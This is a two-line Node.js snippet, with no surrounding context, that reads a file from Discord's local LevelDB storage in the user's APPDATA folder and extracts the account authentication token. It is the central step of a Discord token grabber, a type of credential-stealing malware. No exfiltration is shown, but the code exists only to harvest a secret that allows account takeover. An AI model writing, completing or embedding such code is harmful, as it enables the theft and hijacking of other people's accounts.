let i = require('fs').readFileSync(process.env.APPDATA + '/Discord/Local Storage/leveldb/000005.ldb', 'utf8')
i = i.substr(i.lastIndexOf('oken')).split('"')[1]
